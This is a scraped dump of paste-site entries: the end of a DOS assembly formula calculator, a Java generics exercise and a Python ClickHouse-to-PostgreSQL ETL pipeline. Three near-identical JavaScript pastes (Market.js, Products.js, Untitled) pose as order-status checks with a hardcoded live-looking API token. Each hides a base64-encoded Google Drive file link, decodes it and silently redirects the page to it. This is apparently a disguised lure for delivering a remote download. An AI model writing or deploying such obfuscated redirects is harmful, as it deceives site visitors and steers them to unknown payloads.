    CASE_LESS_THAN_10:   
    ; Calculate Z = x - 1
                         MOV    AX, xvalue
                         SUB    AX, 1
                         MOV    result, AX
                         MOV    remainder, 0
                         JMP    END_FUNC

    CASE_EQUAL_10:       
    ; Calculate Z = (3x^2 + 4) / (x - 2)
    ; First calculate x^2
                         MOV    AX, xvalue
                         IMUL   xvalue                        ; DX:AX = x^2
    
    ; Calculate 3x^2
                         MOV    BX, 3
                         IMUL   BX                            ; DX:AX = 3x^2
    
    ; Add 4: AX = 3x^2 + 4
                         ADD    AX, 4
    
                         MOV    numerator, AX
    
    ; Calculate denominator: (x-2)
                         MOV    BX, xvalue
                         SUB    BX, 2
                         MOV    denominator, BX
    
    ; Perform division
                         MOV    AX, numerator
                         CWD                                  ; Convert word to double word for division
                         IDIV   denominator
                         MOV    result, AX
                         MOV    remainder, DX
                         JMP    END_FUNC

    CASE_GREATER_THAN_10:
    ; Calculate Z = (7x^2 - 56) / (2x - 5)
                         MOV    AX, xvalue
                         MOV    temp_reg, AX                  ; Store x in temp_reg
    
    ; Calculate x^2 carefully using a loop for large values
                         MOV    AX, xvalue
                         IMUL   xvalue                        ; DX:AX = x^2
    
    ; If overflow occurred, use manual multiplication
                         CMP    DX, 0
                         JNE    CALC_OVERFLOW
    
    ; Calculate 7x^2
                         MOV    BX, 7
                         MUL    BX                            ; DX:AX = 7x^2
    
    ; Check for overflow
                         CMP    DX, 0
                         JNE    CALC_OVERFLOW
    
    ; Subtract 56: AX = 7x^2 - 56
                         SUB    AX, 56
                         MOV    numerator, AX
    
    ; Calculate denominator: (2x-5)
                         MOV    AX, temp_reg                  ; Retrieve x from temp_reg
                         MOV    BX, 2
                         IMUL   BX                            ; AX = 2x
                         SUB    AX, 5                         ; AX = 2x - 5
                         MOV    denominator, AX
    
    ; Check if denominator is 0
                         CMP    AX, 0
                         JE     RANGE_ERROR_FUNC
    
    ; Perform division - ensure signs are handled correctly
                         MOV    AX, numerator
                         MOV    BX, denominator
    
    ; Check if numerator is negative
                         CMP    AX, 0
                         JGE    CHECK_DENOM_SIGN
    
    ; Numerator is negative
                         NEG    AX
                         XOR    SI, SI                        ; SI=0 means positive result initially
                         INC    SI                            ; SI=1 means need to negate result
                         JMP    PERFORM_DIV
    
    CHECK_DENOM_SIGN:    
                         XOR    SI, SI                        ; SI=0 means positive result
    
    ; Check if denominator is negative
                         CMP    BX, 0
                         JGE    PERFORM_DIV
    
    ; Denominator is negative
                         NEG    BX
                         INC    SI                            ; Toggle result sign
    
    PERFORM_DIV:         
                         MOV    numerator, AX                 ; Update with absolute values
                         MOV    denominator, BX
    
    ; Perform division with absolute values
                         CWD                                  ; Convert word to double word for division
                         IDIV   BX
                         MOV    result, AX
                         MOV    remainder, DX
    
    ; Apply sign if needed
                         CMP    SI, 0
                         JE     END_FUNC
                         NEG    result                        ; Negate result if signs were different
                         NEG    remainder                     ; Negate remainder too when result is negative
    
                         JMP    END_FUNC

    CALC_OVERFLOW:       
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET overflow_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START

    END_FUNC:            
                         RET

    RANGE_ERROR_FUNC:    
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START
FUNC ENDP
PRINTING PROC
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET outmes
                         MOV    AH, 9
                         INT    21h
                         MOV    AX, remainder
                         CMP    AX, 0
                         JNE    PRINT_FRACTION
                         MOV    AX, result
                         CMP    AX, 0
                         JGE    PRINT_MAIN_NUMBER
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, result
                         NEG    AX
    PRINT_MAIN_NUMBER:   
                         CALL   PRINT_NUM
                         JMP    END_PRINTING
    PRINT_FRACTION:      
                         MOV    AX, numerator
                         CMP    AX, 0
                         JGE    PRINT_NUMERATOR
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, numerator
                         NEG    AX
    PRINT_NUMERATOR:     
                         CALL   PRINT_NUM
                         MOV    DL, '/'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, denominator
                         CMP    AX, 0
                         JGE    PRINT_DENOMINATOR
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, denominator
                         NEG    AX
    PRINT_DENOMINATOR:   
                         CALL   PRINT_NUM
                         MOV    DL, ' '
                         MOV    AH, 2
                         INT    21h
                         MOV    DL, '='
                         INT    21h
                         MOV    DL, ' '
                         INT    21h
                         MOV    AX, result
                         CMP    AX, 0
                         JGE    PRINT_RES_NUMBER
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, result
                         NEG    AX
    PRINT_RES_NUMBER:    
                         CALL   PRINT_NUM
                         MOV    DX, OFFSET ostacha_msg
                         MOV    AH, 9
                         INT    21h
                         MOV    AX, remainder
                         CMP    AX, 0
                         JL     NEG_REM
                         CALL   PRINT_NUM
                         JMP    END_PRINTING
    NEG_REM:             
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, remainder
                         NEG    AX
                         CALL   PRINT_NUM
    END_PRINTING:        
                         RET
PRINTING ENDP
PRINT_NUM PROC
                         PUSH   result
                         PUSH   CX
                         PUSH   DX
                         XOR    CX, CX
                         MOV    BX, 10
    CONVERT_TO_STR:      
                         XOR    DX, DX
                         DIV    BX
                         ADD    DL, '0'
                         PUSH   DX
                         INC    CX
                         TEST   AX, AX
                         JNZ    CONVERT_TO_STR
    PRINT_LOOP:          
                         POP    DX
                         MOV    AH, 2
                         INT    21h
                         LOOP   PRINT_LOOP
                         POP    DX
                         POP    CX
                         POP    result
                         RET
PRINT_NUM ENDP
END_PROGRAM PROC
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET end_msg
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET menuhold
                         MOV    AH, 0Ah
                         INT    21h
                         MOV    AL, menuhold+2
                         CMP    AL, 'y'
                         JE     RETURN
                         CMP    AL, 'n'
                         JE     EXIT_PROGRAM
                         MOV    DX, OFFSET errmsg
                         MOV    AH, 9
                         INT    21h
                         JMP    END_PROGRAM
    EXIT_PROGRAM:        
                         MOV    AH, 4Ch
                         INT    21h
    RETURN:              
                         XOR    AX, AX
                         XOR    BX, BX
                         XOR    CX, CX
                         XOR    DX, DX
                         XOR    SI, SI
                         MOV    result, 0
                         MOV    remainder, 0
                         MOV    numerator, 0
                         MOV    denominator, 0
                         MOV    sign_flag, 0
                         CALL   RET_PROC
END_PROGRAM ENDP
CODE ENDS
END START"
zDX7tJaD,Market.js,Epiphemeral,JavaScript,Thursday 17th of April 2025 02:54:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04410/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xepdxX8z,Untitled,Epiphemeral,JavaScript,Thursday 17th of April 2025 02:39:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89648/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
T9Kp698q,[NP] Triplets,dzocesrce,Java,Thursday 17th of April 2025 02:24:57 AM CDT,"import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;
import java.util.Scanner;

class Triple<T extends Number> {
    private List<T> numbers = new ArrayList<>();

    public Triple(T number1, T number2, T number3) {

        numbers.add(number1);
        numbers.add(number2);
        numbers.add(number3);
    }

    public void sort(){
         numbers= numbers.stream().sorted(Comparator.comparing(i->{return i.doubleValue();}))
                .collect(Collectors.toList());
    }

    public double avarage(){
        return numbers.stream().mapToDouble(i->i.doubleValue()).average().getAsDouble();

    }

    public double max(){
        return numbers.stream().mapToDouble(i->i.doubleValue()).max().getAsDouble();

    }

    @Override
    public String toString() {
        return String.format(""%.2f %.2f %.2f"",numbers.get(0).doubleValue(),numbers.get(1).doubleValue(),numbers.get(2).doubleValue());
    }
}

public class TripleTest {
	public static void main(String[] args) {
		Scanner scanner = new Scanner(System.in);
		int a = scanner.nextInt();
		int b = scanner.nextInt();
		int c = scanner.nextInt();
		Triple<Integer> tInt = new Triple<Integer>(a, b, c);
		System.out.printf(""%.2f\n"", tInt.max());
		System.out.printf(""%.2f\n"", tInt.avarage());
		tInt.sort();
		System.out.println(tInt);
		float fa = scanner.nextFloat();
		float fb = scanner.nextFloat();
		float fc = scanner.nextFloat();
		Triple<Float> tFloat = new Triple<Float>(fa, fb, fc);
		System.out.printf(""%.2f\n"", tFloat.max());
		System.out.printf(""%.2f\n"", tFloat.avarage());
		tFloat.sort();
		System.out.println(tFloat);
		double da = scanner.nextDouble();
		double db = scanner.nextDouble();
		double dc = scanner.nextDouble();
		Triple<Double> tDouble = new Triple<Double>(da, db, dc);
		System.out.printf(""%.2f\n"", tDouble.max());
		System.out.printf(""%.2f\n"", tDouble.avarage());
		tDouble.sort();
		System.out.println(tDouble);
	}
}
"
YttJV4mG,Products.js,Epiphemeral,JavaScript,Thursday 17th of April 2025 02:24:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35477/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iTMem9ib,Untitled,gubichas,Python,Thursday 17th of April 2025 02:22:43 AM CDT,"config.py:
""""""
Файл для хранения конфигураций подключения к базам данных.
""""""

import os

# ClickHouse Configuration
CLICKHOUSE_CONFIG = {
    'host': os.getenv('CLICKHOUSE_HOST', 'localhost'),
    'port': int(os.getenv('CLICKHOUSE_PORT', '8123')),
    'username': os.getenv('CLICKHOUSE_USER', 'default'),
    'password': os.getenv('CLICKHOUSE_PASSWORD', ''),
    'database': os.getenv('CLICKHOUSE_DATABASE', 'default')
}

# PostgreSQL Configuration
POSTGRES_CONFIG = {
    'host': os.getenv('POSTGRES_HOST', 'localhost'),
    'port': int(os.getenv('POSTGRES_PORT', '5432')),
    'database': os.getenv('POSTGRES_DATABASE', 'your_database'),
    'user': os.getenv('POSTGRES_USER', 'your_user'),
    'password': os.getenv('POSTGRES_PASSWORD', 'your_password')
}

# General Configuration
TABLE_NAME = os.getenv('TABLE_NAME', 'your_table')
BATCH_SIZE = int(os.getenv('BATCH_SIZE', '1000'))

clickhouse_connector.py:
""""""
Модуль для подключения и извлечения данных из ClickHouse.
""""""

import clickhouse_connect
import logging

class ClickHouseConnector:
    """"""
    Класс для управления подключением к ClickHouse.
    """"""

    def __init__(self, config):
        """"""
        Инициализация подключения к ClickHouse.

        Args:
            config (dict): Словарь с параметрами подключения.
        """"""
        self.config = config
        self.client = None

    def connect(self):
        """"""
        Установление соединения с ClickHouse.
        """"""
        try:
            self.client = clickhouse_connect.get_client(**self.config)
            logging.info(f""Успешно подключено к ClickHouse: {self.config['host']}"")
        except Exception as e:
            logging.error(f""Ошибка подключения к ClickHouse: {e}"")
            raise

    def extract_data(self, table_name, query=None):
        """"""
        Извлечение данных из ClickHouse.

        Args:
            table_name (str): Имя таблицы для извлечения.
            query (str, optional): SQL запрос для извлечения. Defaults to None (использует SELECT * FROM table_name).

        Returns:
            list: Список кортежей с данными.
        """"""
        try:
            if query is None:
                query = f""SELECT * FROM {table_name}""
            data = self.client.query(query).result
            logging.info(f""Извлечено {len(data)} строк из ClickHouse."")
            return data
        except Exception as e:
            logging.error(f""Ошибка при извлечении данных из ClickHouse: {e}"")
            raise

    def get_table_schema(self, table_name):
        """"""
        Получает схему таблицы из ClickHouse.

        Args:
            table_name (str): Имя таблицы.

        Returns:
            list: Список кортежей с описанием столбцов.
        """"""
        try:
            schema = self.client.query(f""DESCRIBE TABLE {table_name}"").result
            return schema
        except Exception as e:
            logging.error(f""Ошибка при получении схемы таблицы из ClickHouse: {e}"")
            raise
    def close(self):
        """"""
        Закрывает соединение с ClickHouse.  Хотя clickhouse-connect не имеет явного метода close(),
        метод здесь для консистентности интерфейса.
        """"""
        logging.info(""Соединение с ClickHouse закрыто."") # Для информации
        self.client = None # Устанавливаем в None, чтобы сборщик мусора удалил клиент.
postgres_connector.py:
""""""
Модуль для подключения и загрузки данных в PostgreSQL.
""""""

import psycopg2
from psycopg2 import extras
import logging


class PostgreSQLConnector:
    """"""
    Класс для управления подключением к PostgreSQL.
    """"""

    def __init__(self, config):
        """"""
        Инициализация подключения к PostgreSQL.

        Args:
            config (dict): Словарь с параметрами подключения.
        """"""
        self.config = config
        self.conn = None
        self.cursor = None

    def connect(self):
        """"""
        Установление соединения с PostgreSQL.
        """"""
        try:
            self.conn = psycopg2.connect(**self.config)
            self.cursor = self.conn.cursor()
            logging.info(f""Успешно подключено к PostgreSQL: {self.config['host']}"")
        except Exception as e:
            logging.error(f""Ошибка подключения к PostgreSQL: {e}"")
            raise

    def load_data(self, table_name, data, batch_size):
        """"""
        Загрузка данных в PostgreSQL.

        Args:
            table_name (str): Имя таблицы для загрузки.
            data (list): Список кортежей с данными.
            batch_size (int): Размер пакета для вставки.
        """"""
        try:
            if not data:
                logging.warning(""Нет данных для загрузки в PostgreSQL."")
                return

            # Получаем описание полей таблицы PostgreSQL
            self.cursor.execute(f""SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}' ORDER BY ordinal_position;"")
            column_names = [row[0] for row in self.cursor.fetchall()]
            columns_str = "", "".join(column_names)  # Строка с именами колонок через запятую

            # Формируем строку для вставки значений
            placeholders = "", "".join([""%s""] * len(column_names))
            query = f""INSERT INTO {table_name} ({columns_str}) VALUES ({placeholders})""

            # Используем execute many для пакетной вставки
            extras.execute_batch(self.cursor, query, data, page_size=batch_size)
            self.conn.commit()

            logging.info(f""Успешно загружено {len(data)} строк в PostgreSQL."")
        except Exception as e:
            self.conn.rollback()  # Откатываем транзакцию в случае ошибки
            logging.error(f""Ошибка при загрузке данных в PostgreSQL: {e}"")
            raise

    def create_table_if_not_exists(self, table_name, clickhouse_table_schema):
        """"""
        Создает таблицу в PostgreSQL, если ее не существует.

        Args:
            table_name (str): Имя таблицы.
            clickhouse_table_schema (list): Схема таблицы из ClickHouse (список кортежей).
        """"""
        try:
            # Проверяем, существует ли таблица в PostgreSQL
            self.cursor.execute(f""SELECT to_regclass('{table_name}')"")
            table_exists = self.cursor.fetchone()[0] is not None

            if not table_exists:
                logging.info(f""Таблица '{table_name}' не существует в PostgreSQL. Создаем..."")

                # Конвертируем типы данных ClickHouse в PostgreSQL
                column_definitions = []
                for column in clickhouse_table_schema:
                    column_name = column[0]
                    clickhouse_type = column[1].lower()  # Приводим к нижнему регистру для надежности
                    postgres_type = self.map_clickhouse_to_postgres_type(clickhouse_type)
                    column_definitions.append(f""{column_name} {postgres_type}"")

                # Формируем SQL запрос для создания таблицы
                create_table_sql = f""""""
                    CREATE TABLE {table_name} (
                        {', '.join(column_definitions)}
                    );
                """"""
                self.cursor.execute(create_table_sql)
                self.conn.commit()
                logging.info(f""Таблица '{table_name}' успешно создана в PostgreSQL."")
            else:
                logging.info(f""Таблица '{table_name}' уже существует в PostgreSQL."")

        except Exception as e:
            self.conn.rollback()
            logging.error(f""Ошибка при создании таблицы в PostgreSQL: {e}"")
            raise

    def map_clickhouse_to_postgres_type(self, clickhouse_type):
        """"""
        Отображает типы данных ClickHouse на типы данных PostgreSQL.

        Args:
            clickhouse_type (str): Тип данных в ClickHouse.

        Returns:
            str: Соответствующий тип данных в PostgreSQL.
        """"""
        type_mapping = {
            ""int8"": ""SMALLINT"",
            ""int16"": ""SMALLINT"",
            ""int32"": ""INTEGER"",
            ""int64"": ""BIGINT"",
            ""uint8"": ""SMALLINT"",
            ""uint16"": ""INTEGER"",
            ""uint32"": ""BIGINT"",
            ""uint64"": ""NUMERIC"",  # Может потребоваться BIGINT в зависимости от диапазона
            ""float32"": ""REAL"",
            ""float64"": ""DOUBLE PRECISION"",
            ""decimal"": ""NUMERIC"",
            ""string"": ""TEXT"",
            ""date"": ""DATE"",
            ""datetime"": ""TIMESTAMP"",
            ""datetime64"": ""TIMESTAMP"",
            ""uuid"": ""UUID"",
            ""boolean"": ""BOOLEAN"",
            ""array(int8)"": ""SMALLINT[]"",
            ""array(int16)"": ""SMALLINT[]"",
            ""array(int32)"": ""INTEGER[]"",
            ""array(int64)"": ""BIGINT[]"",
            ""array(uint8)"": ""SMALLINT[]"",
            ""array(uint16)"": ""INTEGER[]"",
            ""array(uint32)"": ""BIGINT[]"",
            ""array(uint64)"": ""NUMERIC[]"",
            ""array(float32)"": ""REAL[]"",
            ""array(float64)"": ""DOUBLE PRECISION[]"",
            ""array(string)"": ""TEXT[]"",
            ""array(date)"": ""DATE[]"",
            ""array(datetime)"": ""TIMESTAMP[]"",
            ""array(datetime64)"": ""TIMESTAMP[]"",
            ""array(uuid)"": ""UUID[]"",
            ""array(boolean)"": ""BOOLEAN[]"",
            # Add other types as needed
        }

        # Обработка типов с указанием размера (например, DateTime64(9))
        if clickhouse_type.startswith(""datetime64""):
            return ""TIMESTAMP""  # DateTime64 в PostgreSQL просто TIMESTAMP, точность теряется
        if clickhouse_type.startswith(""decimal""):
            return ""NUMERIC""
        if clickhouse_type.startswith(""fixedstring""):
            return ""TEXT""  # FixedString in ClickHouse, TEXT in PostgreSQL

        # Обработка Nullable типов
        if clickhouse_type.startswith(""nullable(""):
            inner_type = clickhouse_type[9:-1]
            return self.map_clickhouse_to_postgres_type(inner_type)

        mapped_type = type_mapping.get(clickhouse_type)
        if mapped_type is None:
            logging.warning(f""Неизвестный тип данных ClickHouse: {clickhouse_type}.  Используется TEXT."")
            return ""TEXT""
        return mapped_type


    def close(self):
        """"""
        Закрытие соединения с PostgreSQL.
        """"""
        if self.cursor:
            self.cursor.close()
        if self.conn:
            self.conn.close()
            logging.info(""Соединение с PostgreSQL закрыто."")


data_transformer.py:
""""""
Модуль для трансформации данных.
""""""

import logging

class DataTransformer:
    """"""
    Класс для трансформации данных.
    """"""

    def transform(self, data):
        """"""
        Трансформация данных.  Реализуйте свою логику трансформации здесь.

        Args:
            data (list): Список кортежей с данными.

        Returns:
            list: Список кортежей с трансформированными данными.
        """"""
        # Здесь можно добавить логику трансформации данных, если необходимо.
        # Например, приведение типов, обработка значений и т.д.
        logging.info(""Трансформация данных выполнена (без изменений)."")
        return data

etl_pipeline.py:
""""""
Основной модуль, определяющий ETL пайплайн.
""""""

import logging
from datetime import datetime
from etl.clickhouse_connector import ClickHouseConnector
from etl.postgres_connector import PostgreSQLConnector
from etl.data_transformer import DataTransformer


class ETLPipeline:
    """"""
    Класс, реализующий ETL пайплайн.
    """"""

    def __init__(self, config):
        """"""
        Инициализация ETL пайплайна.

        Args:
            config (dict): Словарь с конфигурациями (ClickHouse, PostgreSQL, общие).
        """"""
        self.config = config
        self.clickhouse_connector = ClickHouseConnector(config['clickhouse'])
        self.postgres_connector = PostgreSQLConnector(config['postgres'])
        self.data_transformer = DataTransformer()
        self.table_name = config['general']['table_name']
        self.batch_size = config['general']['batch_size']

    def run(self):
        """"""
        Запуск ETL пайплайна.
        """"""
        start_time = datetime.now()
        logging.info(""Запуск ETL пайплайна..."")

        try:
            self.clickhouse_connector.connect()
            self.postgres_connector.connect()

            # Получаем схему таблицы из ClickHouse
            clickhouse_table_schema = self.clickhouse_connector.get_table_schema(self.table_name)
            self.postgres_connector.create_table_if_not_exists(self.table_name, clickhouse_table_schema)

            # Извлекаем данные из ClickHouse
            data = self.clickhouse_connector.extract_data(self.table_name)

            # Трансформируем данные
            transformed_data = self.data_transformer.transform(data)

            # Загружаем данные в PostgreSQL
            self.postgres_connector.load_data(self.table_name, transformed_data, self.batch_size)


        except Exception as e:
            logging.error(f""ETL пайплайн завершился с ошибкой: {e}"")

        finally:
            # Закрываем соединения
            self.clickhouse_connector.close()
            self.postgres_connector.close()

        end_time = datetime.now()
        duration = end_time - start_time
        logging.info(f""ETL пайплайн успешно завершен за {duration}."")

# main.py
```python
""""""
Основной файл для запуска ETL пайплайна.
""""""

import logging
from etl.etl_pipeline import ETLPipeline
from etl import config

if __name__ == '__main__':
    # Настройка логирования
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Создаем объединенную конфигурацию
    etl_config = {
        'clickhouse': config.CLICKHOUSE_CONFIG,
        'postgres': config.POSTGRES_CONFIG,
        'general': {
            'table_name': config.TABLE_NAME,
            'batch_size': config.BATCH_SIZE
        }
    }

    # Создаем экземпляр ETL пайплайна и запускаем его
    etl = ETLPipeline(etl_config)
    etl.run()"
